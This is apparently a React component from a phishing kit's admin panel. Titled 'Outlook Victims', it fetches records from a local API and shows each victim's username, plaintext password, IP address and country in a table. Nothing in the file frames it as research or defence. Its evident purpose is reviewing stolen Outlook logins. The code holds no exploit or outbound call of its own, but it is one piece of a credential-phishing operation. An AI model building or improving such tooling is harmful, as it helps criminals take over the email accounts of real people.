export default async function Outlook() {
  const res = await fetch("http://localhost:3000/api/outlook");
  const posts = await res.json();
  return (
    <section className="socialMain">
      <div className="table">
        <h1>Outlook Victims</h1>
        <div className="tbl-header">
          <table cellPadding="0" cellSpacing="0" border="0">
            <thead>
              <tr>
                <th>Date & Time</th>
                <th>Username</th>
                <th>Password</th>
                <th>IP Address</th>
                <th>Country</th>
              </tr>
            </thead>
          </table>
        </div>
        <div className="tbl-content">
          <table cellPadding="0" cellSpacing="0" border="0">
            <tbody>
              {posts?.map((post) => (
                <tr key={post?.id}>
                  <td>{post?.date}</td>
                  <td>{post?.username} </td>
                  <td>{post?.password}</td>
                  <td>{post?.ip_address}</td>
                  <td>{post?.country}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </section>
  );
}
